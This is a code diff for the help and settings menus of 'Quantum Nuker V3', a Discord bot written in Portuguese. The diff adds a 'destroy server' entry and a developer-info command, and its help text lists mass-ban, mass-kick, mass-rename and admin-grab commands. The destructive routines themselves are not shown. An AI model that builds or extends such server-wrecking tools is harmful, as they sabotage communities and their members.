@@ -232,8 +232,9 @@ async def on_command_error(ctx, err):
 async def help(ctx):
     await msg_delete(ctx)
     p = bot.command_prefix
-    embed=discord.Embed(title=f"Ajuda e informações — Quantum Nuker", url="https://github.com/user001js/Quantum-Nuker-V3", description="Baixe o **Quantum Nuker V3** __[aqui](https://github.com/user001js/Quantum-Nuker-V3)__.", color=0x0400ff)
+    embed=discord.Embed(title=f"Ajuda e informações — Quantum Nuker", url="https://github.com/user001js/Quantum-Nuker-V3", description="> Baixe o **Quantum Nuker V3** __[aqui](https://github.com/user001js/Quantum-Nuker-V3)__", color=0x0400ff)
     embed.set_author(name=f"Quantum Nuker V3", url="https://github.com/user001js/Quantum-Nuker-V3")
+    embed.add_field(name=f"Destruir servidor", value=f"`{p}1`, `{p}nk`, `{p}nuke`, `{p}atacar`, `{p}dest`, `{p}destruir`, `{p}attack` ou `{p}n` + `<banir 1/0>` + `<mensagem de texto>`")
     embed.add_field(name=f"Banir todos os membros do servidor", value=f"`{p}2`, `{p}be`, `{p}baneveryone`, `{p}banall`, `{p}banirtodos` ou `{p}ba`", inline=False)
     embed.add_field(name=f"Expulsar todos os membros do servidor", value=f"`{p}3`, `{p}ke`, `{p}kickeveryone`, `{p}expulsartodos`, `{p}kickall` ou `{p}ka`", inline=False)
     embed.add_field(name=f"Renomear todos os membros do servidor", value=f"`{p}4`, `{p}rn`, `{p}rnall`, `{p}rmall`, `{p}renameallmembers` ou `{p}renomeartodos` + <novo nome de usuário>`", inline=False)
@@ -249,7 +250,7 @@ async def help(ctx):
     embed.add_field(name=f"Obter cargo com permissões administrativas", value=f"`{p}14`, `{p}ga`, `{p}getadmin`, `{p}obteradmin`, `{p}conseguiradmin` ou `{p}admin` + `<nome do cargo>`", inline=False)
     embed.add_field(name=f"Recuperar (somente em mensagem direta)", value=f"Cria 1 canal de texto no servidor (use caso você tenha deletado todos os canais no servidor).\nUse `{p}15 <ID do servidor>`, `{p}rg <ID do servidor>`, `{p}recuperarservidor <ID do servidor>`, `{p}rs <ID do servidor>` ou `{p}recuperateserver <ID do servidor>`", inline=False)
     embed.add_field(name=f"Configurações", value=f"`{p}settings` ou `{p}config`", inline=False)
-    embed.add_field(name=f"Informações de desenvolvimento — Quantum Nuker V3", value=f"Desenvolvido por <@738674601499820085>, com o [MI-1](https://discord.gg/2AkAeZD6BU)\n\nVersão: {version} {checkVersion()}\nProjeto: https://github.com/user001js/Quantum-Nuker-V3\n\nServidor do Discord: https://discord.gg/2AkAeZD6BU\n\n> **Lista de comandos**\n\nEncontre os comandos e mais informações clicando __[aqui](https://github.com/user001js/Quantum-Nuker-V3/)__.", inline=False)
+    embed.add_field(name=f"Informações de desenvolvimento — Quantum Nuker V3", value=f"`{p}info`, `{p}desenvolvimento` ou `{p}infodev`", inline=False)
     embed.set_footer(text="© 2022 MI-1, user 001")
     await ctx.message.author.send(embed=embed)
 
@@ -262,13 +263,27 @@ async def settings(ctx):
         title="Configurações — Quantum Nuker", description="Configurações disponíveis:\n`Os comandos aqui só poderão ser executados pelos usuários definidos como proprietários do robô.`", color=embedColor)
     embed.set_author(name="Quantum Nuker V3", url="https://github.com/user001js/Quantum-Nuker-V3")
     embed.add_field(
-        name="Prefixo", value=f"> Altere o prefixo do(a) \"{bot.user}\".\nUse `{p}config prefix <prefixo>`, `{p}config prefixo <prefixo>` ou `{p}configurar prefixo <prefixo>`", inline=False)
+        name="Prefixo", value=f"> Altere o prefixo do(a) \"{bot.user}\".\n\nUse `{p}config prefix <prefixo>`, `{p}config prefixo <prefixo>` ou `{p}configurar prefixo <prefixo>`", inline=False)
     embed.add_field(
-        name="Proprietários", value=f"> Adicione ou remova um(a) usuário(a) da equipe de proprietários do(a) \"{bot.user}\".\nUse `{p}settings owners <add/remove> <menção/ID>` ou `{p}configurar owners <add/remove> <menção/ID>`", inline=False)
+        name="Proprietários", value=f"> Adicione ou remova um(a) usuário(a) da equipe de proprietários do(a) \"{bot.user}\".\n\nUse `{p}settings owners <add/remove> <menção/ID>` ou `{p}configurar owners <add/remove> <menção/ID>`", inline=False)
     embed.add_field(
-        name="Lista de permissões (\"whitelist\")", value=f"> Ative ou desative a lista de permissões.\nUse `{p}settings whitelist <on/off>` ou `{p}configurar whitelist <on/off>`", inline=True)
+        name="Lista de permissões (\"whitelist\")", value=f"> Ative ou desative a lista de permissões.\n\nUse `{p}settings whitelist <on/off>` ou `{p}configurar whitelist <on/off>`", inline=True)
     embed.add_field(
-        name="Atividade do robô", value=f"> Altere ou desative a atividade do(a) \"{bot.user}\".\n> Tipos disponíveis de atividades: `playing` ou `jogando`, `listening` ou `ouvindo`, `watching` ou `assistindo`.\nUse `{p}settings activity <set/off> <tipo> <texto>` ou `{p}configurar atividade <set/off> <tipo> <texto>`.", inline=False)
+        name="Atividade do robô", value=f"> Altere ou desative a atividade do(a) \"{bot.user}\".\n> Tipos disponíveis de atividades: `playing` ou `jogando`, `listening` ou `ouvindo`, `watching` ou `assistindo`.\n\nUse `{p}settings activity <set/off> <tipo> <texto>` ou `{p}configurar atividade <set/off> <tipo> <texto>`.", inline=False)
+    await ctx.message.author.send(embed=embed)
+    
+@bot.group(name='info', aliases=["devinfo", "infodev", "botdevs", "development", "desenvolvimento"], invoke_without_command=True)
+@commands.check(isWhitelisted)
+async def info(ctx):
+    p = bot.command_prefix
+    embed=discord.Embed(title=f"Informações de desenvolvimento — Quantum Nuker V3", url="https://github.com/user001js/Quantum-Nuker-V3", description="Conheça os desenvolvedores e autores pelo funcionamento interno desta máquina, veja outras informações envolvendo a versão, localização do projeto, etc.", color=0x2d1ff4)
+    embed.set_author(name=f"Quantum Nuker V3", url="https://github.com/user001js/Quantum-Nuker-V3")
+    embed.add_field(name=f"Desenvolvedor", value=f"Desenvolvido por <@738674601499820085>, com o [MI-1](https://discord.gg/2AkAeZD6BU).", inline=False)
+    embed.add_field(name=f"Projeto", value=f"https://github.com/user001js/Quantum-Nuker-V3", inline=True)
+    embed.add_field(name=f"Versão", value=f"{version} {checkVersion()}", inline=True)
+    embed.add_field(name=f"Servidor do Discord", value=f"https://discord.gg/2AkAeZD6BU", inline=False)
+    embed.add_field(name=f"Prefixo", value=f"`{bot.command_prefix}`", inline=False)
+    embed.set_footer(text="© 2022 MI-1, user 001")
     await ctx.message.author.send(embed=embed)
 
 
